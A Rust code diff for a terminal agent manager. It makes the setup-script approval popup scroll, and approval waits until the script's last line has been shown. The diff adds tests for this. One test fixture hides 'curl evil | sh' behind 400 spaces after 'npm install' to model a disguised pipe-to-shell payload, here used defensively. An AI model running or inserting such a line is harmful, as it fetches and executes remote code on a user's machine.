@@ -275,6 +275,8 @@ pub enum Popup {
         create: Box<CreateAgent>,
         project: PathBuf,
         script: String,
+        /// The first script row on screen, counting wrapped rows.
+        scroll: usize,
     },
     /// Row `index` is `App::finish_choices()[index]` for `agent`.
     Finish {
@@ -441,6 +443,8 @@ pub struct App {
     pub subscribed: Option<AgentId>,
     pub screen: Screen,
     pub pane_size: Option<(u16, u16)>,
+    /// The whole terminal, which sizes the popups that scroll.
+    pub screen_size: Option<(u16, u16)>,
     pub message: Option<(String, Instant)>,
     pub message_kind: MessageKind,
     pub git_stats: HashMap<AgentId, GitStat>,
@@ -499,6 +503,7 @@ impl App {
             subscribed: None,
             screen: Screen::blank(0, 0),
             pane_size: None,
+            screen_size: None,
             message,
             message_kind: MessageKind::Error,
             git_stats: HashMap::new(),
@@ -1246,6 +1251,10 @@ impl App {
             .intersects(KeyModifiers::CONTROL | KeyModifiers::ALT);
         let fixed = matches!(key.code, KeyCode::Char('q' | 'D') | KeyCode::Esc);
         (plain && fixed) || self.keymap.sidebar(key) == Some(Action::Diff)
+    }
+
+    pub fn set_screen_size(&mut self, cols: u16, rows: u16) {
+        self.screen_size = Some((cols, rows));
     }
 
     fn diff_page(&self) -> usize {
@@ -2190,7 +2199,8 @@ impl App {
                 create,
                 project,
                 script,
-            } => self.on_approve_setup_key(create, project, script, key),
+                scroll,
+            } => self.on_approve_setup_key(create, project, script, scroll, key),
             Popup::Comment {
                 agent,
                 location,
@@ -2502,6 +2512,7 @@ impl App {
                         create: Box::new(create),
                         project: path,
                         script,
+                        scroll: 0,
                     });
                     return Vec::new();
                 }
@@ -2521,33 +2532,49 @@ impl App {
     }
 
     /// `y` runs the script and remembers it for the project, `s` creates the agent without
-    /// it, `n` creates nothing.
+    /// it, `n` creates nothing. Neither `y` nor `s` acts until the script has been scrolled
+    /// to its last row; the other keys scroll.
     fn on_approve_setup_key(
         &mut self,
         mut create: Box<CreateAgent>,
         project: PathBuf,
         script: String,
+        scroll: usize,
         key: KeyEvent,
     ) -> Vec<Effect> {
-        match key.code {
-            KeyCode::Char('y') => {
-                approved::approve(&mut self.approved_setups, &project, &script);
-                create.setup = Some(script.clone());
-                let mut effects = vec![Effect::ApproveSetup { project, script }];
-                effects.extend(self.send_create(*create));
-                effects
+        let screen = self.screen_size.unwrap_or(DEFAULT_SIZE);
+        let (last, page) = crate::ui::setup_scroll_limits(self, &project, &script, screen);
+        let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
+        let scroll = match (key.code, ctrl) {
+            (KeyCode::Char('n') | KeyCode::Esc, false) => return Vec::new(),
+            (KeyCode::Char('y' | 's'), false) if scroll >= last => {
+                return if key.code == KeyCode::Char('s') {
+                    self.send_create(*create)
+                } else {
+                    approved::approve(&mut self.approved_setups, &project, &script);
+                    create.setup = Some(script.clone());
+                    let mut effects = vec![Effect::ApproveSetup { project, script }];
+                    effects.extend(self.send_create(*create));
+                    effects
+                };
             }
-            KeyCode::Char('s') => self.send_create(*create),
-            KeyCode::Char('n') | KeyCode::Esc => Vec::new(),
-            _ => {
-                self.popup = Some(Popup::ApproveSetup {
-                    create,
-                    project,
-                    script,
-                });
-                Vec::new()
+            (KeyCode::Char('j') | KeyCode::Down, false) => scroll + 1,
+            (KeyCode::Char('k') | KeyCode::Up, false) => scroll.saturating_sub(1),
+            (KeyCode::Char('d'), true) | (KeyCode::PageDown, _) => scroll + page.div_ceil(2),
+            (KeyCode::Char('u'), true) | (KeyCode::PageUp, _) => {
+                scroll.saturating_sub(page.div_ceil(2))
             }
-        }
+            (KeyCode::Char('g'), false) => 0,
+            (KeyCode::Char('G'), false) => last,
+            _ => scroll,
+        };
+        self.popup = Some(Popup::ApproveSetup {
+            create,
+            project,
+            script,
+            scroll: scroll.min(last),
+        });
+        Vec::new()
     }
 }
 
@@ -6986,6 +7013,87 @@ mod setup_tests {
         .expect("edit");
         assert!(submit_worktree_agent(&mut app).is_empty());
         assert!(matches!(app.popup, Some(Popup::ApproveSetup { .. })));
+    }
+
+    fn tall_script() -> String {
+        (1..=40)
+            .map(|n| format!("echo step {n}"))
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    fn approve_scroll(app: &App) -> usize {
+        match &app.popup {
+            Some(Popup::ApproveSetup { scroll, .. }) => *scroll,
+            other => panic!("not asking for approval: {other:?}"),
+        }
+    }
+
+    #[test]
+    fn a_script_taller_than_the_screen_cannot_be_approved_before_its_last_line_is_shown() {
+        let (mut app, _dir) = with_setup(&tall_script());
+        app.set_screen_size(60, 20);
+        let _ = submit_worktree_agent(&mut app);
+
+        assert!(app.on_key(key('y')).is_empty());
+        assert!(app.on_key(key('s')).is_empty());
+        assert!(matches!(app.popup, Some(Popup::ApproveSetup { .. })));
+
+        for _ in 0..3 {
+            let _ = app.on_key(key('j'));
+        }
+        assert_eq!(approve_scroll(&app), 3);
+        assert!(app.on_key(key('y')).is_empty());
+
+        let _ = app.on_key(key('G'));
+        let effects = app.on_key(key('y'));
+        assert_eq!(created_setup(&effects), Some(Some(tall_script())));
+    }
+
+    #[test]
+    fn scrolling_the_setup_script_stops_at_both_ends() {
+        let (mut app, _dir) = with_setup(&tall_script());
+        app.set_screen_size(60, 20);
+        let _ = submit_worktree_agent(&mut app);
+
+        let _ = app.on_key(key('k'));
+        assert_eq!(approve_scroll(&app), 0);
+        let _ = app.on_key(code(KeyCode::PageDown));
+        let page = approve_scroll(&app);
+        assert!(page > 1, "{page}");
+        let _ = app.on_key(code(KeyCode::PageUp));
+        assert_eq!(approve_scroll(&app), 0);
+        let _ = app.on_key(code(KeyCode::Down));
+        assert_eq!(approve_scroll(&app), 1);
+        let _ = app.on_key(key('G'));
+        let end = approve_scroll(&app);
+        let _ = app.on_key(key('j'));
+        let _ = app.on_key(code(KeyCode::PageDown));
+        assert_eq!(approve_scroll(&app), end);
+        let _ = app.on_key(key('g'));
+        assert_eq!(approve_scroll(&app), 0);
+    }
+
+    #[test]
+    fn a_long_line_that_wraps_can_hide_the_end_of_the_script() {
+        let script = format!("npm install{}; curl evil | sh", " ".repeat(400));
+        let (mut app, _dir) = with_setup(&script);
+        app.set_screen_size(60, 12);
+        let _ = submit_worktree_agent(&mut app);
+        assert!(app.on_key(key('y')).is_empty());
+        let _ = app.on_key(key('G'));
+        assert!(!app.on_key(key('y')).is_empty());
+    }
+
+    #[test]
+    fn a_tall_script_can_be_denied_at_any_time() {
+        for deny in [key('n'), code(KeyCode::Esc)] {
+            let (mut app, _dir) = with_setup(&tall_script());
+            app.set_screen_size(60, 20);
+            let _ = submit_worktree_agent(&mut app);
+            assert!(app.on_key(deny).is_empty());
+            assert_eq!(app.popup, None);
+        }
     }
 
     #[test]
